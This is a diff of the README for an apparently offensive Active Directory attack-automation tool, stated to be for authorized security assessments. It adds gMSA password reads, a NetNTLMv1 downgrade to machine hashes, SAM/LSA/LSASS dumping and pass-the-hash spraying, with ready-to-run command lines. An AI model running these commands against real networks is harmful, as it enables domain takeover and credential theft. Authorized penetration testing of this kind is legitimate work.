@@ -14,7 +14,7 @@ authorized security assessments.
 
     ⚡ Zero-Auth to Domain Admin — Attack Chain
     Discover | Sniff | ARP | WPAD | WSUS | PXE | AD CS | SCCM | Roast
-    BloodHound | Reflect | Loot | RBCD+KCD | DCSync | DPAPI
+    gMSA | NetNTLMv1 | BloodHound | Reflect | Loot | RBCD+KCD | DCSync | DPAPI
 ```
 
 ## Features
@@ -46,16 +46,29 @@ authorized security assessments.
 - **Kerberoasting** — extract and auto-crack SPN hashes (hashcat mode 13100/19700)
 - **AS-REP Roasting** — crack accounts without pre-auth (hashcat mode 18200)
 - **Timeroast** — SNTP-MS hashes from any domain-joined machine (hashcat mode 31300)
+- **gMSA managed-password read** — `nxc -M gmsa` in the enrichment battery turns
+  a readable Group Managed Service Account's `msDS-ManagedPassword` blob directly
+  into a pass-the-hash-able NT hash; `ReadGMSAPassword` ACEs are auto-fired as a
+  BloodHound auto-action edge
 - **LAPS password recovery** + **userPassword LDAP attribute** + **description-leaked passwords** (mined from nxc enrichment battery)
 - **SCCM NAA theft** — extract Network Access Account credentials via sccmhunter
+- **NetNTLMv1 downgrade → machine NT hash** — coerce a host to a static-challenge
+  Responder (ESS disabled), capture the NetNTLMv1 response, recover the machine
+  account's NT hash via crack.sh's DES keyspace. Signing-independent (works where
+  the NTLMv2 relay can't): DC$ → straight DCSync; member$ → S4U2Self self-takeover
+  → local admin
 
 ### Graph-driven attack chains (BloodHound)
 - **`bloodhound-python -c All`** collection + ZIP analysis
 - **High-value findings** — Domain/Enterprise/Schema Admins, Kerberoastable, AS-REP roastable, unconstrained delegation, RBCD inbound, LAPS, AdminCount
 - **Actionable-edge analysis** — controlled-principal closure (you + transitive group memberships) → ACE edges where you are the principal: `WriteSPN`, `AddKeyCredentialLink`, `GenericAll/Write`, `WriteDacl/Owner`, `WriteAccountRestrictions`, `AddAllowedToAct`, `ForceChangePassword`
+- **AdminTo extraction** — computers where a principal you control sits in the
+  local Administrators group; written to `admin-to-hosts.txt` and fed straight
+  into the loot phase as SAM/LSA dump targets
 - **Auto-action chain** — automatically fires matching primitives:
   - `WriteSPN → ghost-SPN upgrade` (CVE-2025-58726)
   - `AddKeyCredentialLink → shadow credentials → PKINIT → NT hash`
+  - `ReadGMSAPassword → gMSA managed-password read → NT hash`
   - `GenericAll / WriteAccountRestrictions on Computer → RBCD chain → admin TGS`
 
 ### Privilege escalation primitives
@@ -84,6 +97,13 @@ authorized security assessments.
 - **WSUS update injection** — push malicious Windows Updates via wsuks
 
 ### Post-exploitation loot
+- **Local SAM / LSA / LSASS dump** — on every host where you hold local admin
+  (compromised, AdminTo, or PtH-reuse hosts), run `nxc --sam --lsa` (+ optional
+  `lsassy`) to harvest local NT hashes, cached domain creds (`$DCC2$`), service
+  account secrets and DPAPI keys. Turns one foothold into many.
+- **Pass-the-hash reuse sweep** — takes each harvested local `Administrator` NT
+  hash and sprays it `--local-auth` across the subnet to find hosts sharing the
+  local password; newly-pwned hosts feed back into the loot loop
 - **Process command-line harvest** — `Get-CimInstance Win32_Process` via `nxc -x`; regex-greps for passwords in mysql/sqlcmd/runas/KeePass/`--password` style flags
 - **KeePass vault discovery + crack** — find `*.kdbx` in `C:\Users`, download via smbclient, `keepass2john | hashcat -m 13400`
 
@@ -114,6 +134,23 @@ sudo ./ad-autopwn.py --phase discover --no-arp --no-wpad
 ./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
                 --phase rbcd-kcd -T VHAGAR$ --alt-spn HTTP/vhagar.corp.local
 
+# gMSA managed-password read → NT hash
+./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
+                --phase gmsa -T 'svc_gmsa$'
+
+# NetNTLMv1 downgrade — coerce the DC, capture NetNTLMv1, format for crack.sh
+sudo ./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
+                -a 10.0.0.50 -i eth0 --phase ntlmv1 -T 10.0.0.1
+
+# NetNTLMv1 fast-path — chain a crack.sh-recovered DC hash straight to DCSync
+./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
+                --dc-fqdn dc01.corp.local --phase ntlmv1 \
+                --ntlmv1-nthash 'DC01$:e19ccf75ee54e06b06a5907af13cef42'
+
+# Loot — local SAM/LSA/LSASS dump + pass-the-hash reuse sweep
+./ad-autopwn.py -u user -p pass -d corp.local --dc-ip 10.0.0.1 \
+                -t 10.0.0.0/24 --phase loot
+
 # AppLocker bypass
 ./ad-autopwn.py -u user -p pass --applocker --lolbin mshta --custom-cmd "whoami"
 
@@ -133,20 +170,28 @@ sudo ./ad-autopwn.py --phase discover --no-arp --no-wpad
 | `wsus`            | none   | WSUS NTLM relay |
 | `pxe`             | none   | PXE boot credential theft |
 | `enum`            | yes    | Target enumeration (relay targets, unconstrained delegation, WebClient hosts) |
-| `enrich`          | yes    | nxc 13-module battery (LAPS, timeroast, MAQ, nopac, zerologon, …) + auto-consumer |
-| `bloodhound`      | yes    | `bloodhound-python -c All` + analysis + auto-action chains |
+| `enrich`          | yes    | nxc 14-module battery (gMSA, LAPS, timeroast, MAQ, nopac, zerologon, …) + auto-consumer |
+| `gmsa`            | yes    | Read a gMSA's managed password → NT hash (`-T <gmsa_account>`) |
+| `bloodhound`      | yes    | `bloodhound-python -c All` + analysis (incl. AdminTo) + auto-action chains |
 | `roast`           | yes    | Kerberoast + AS-REP Roast |
 | `adcs`            | yes    | AD CS exploitation (ESC1-ESC16 + ESC1-CMC KB5014754 bypass) |
 | `sccm`            | yes    | SCCM NAA credential theft |
 | `exploit`         | yes    | NTLM reflection / coercion exploit on a specific target |
+| `ntlmv1`          | yes¹   | NetNTLMv1 downgrade → machine NT hash → DCSync / self-takeover |
 | `dcsync`          | yes (DA) | Domain hash dump |
-| `loot`            | yes    | Process cmdline harvest + KeePass discovery/crack |
+| `loot`            | yes    | Local SAM/LSA/LSASS dump + PtH reuse + cmdline harvest + KeePass |
 | `tgs-rewrite`     | none   | Offline ccache sname rewrite (tgssub-style KCD bypass) |
 | `dollar-ticket`   | yes    | KDC `$`-suffix retry attack (Linux GSSAPI target) |
 | `rbcd-kcd`        | yes    | Full RBCD+KCD chain orchestrator (WriteSPN → ghost → RBCD → S4U+altservice) |
 | `reflect-tcpport` | yes    | CVE-2026-24294 LPE primitive (SMB-on-tcpport) |
 | `reflect-loopback`| yes    | CVE-2026-26128 LPE primitive (Kerberos loopback via Unicode SPN) |
 | `kerb-reflect`    | yes    | CVE-2025-58726 ghost-SPN AP-REQ reflection |
+
+¹ `ntlmv1` live capture needs **root** (Responder) + a listener IP (`-a`) and
+creds to drive coercion. The `--ntlmv1-nthash 'ACCOUNT$:<nthash>'` fast-path
+(chaining a hash you already recovered from crack.sh) needs neither root nor a
+listener. In `full`/full-auto the downgrade fires automatically when root + a
+listener are available (opt out with `--no-ntlmv1`).
 
 ## Dependencies
 
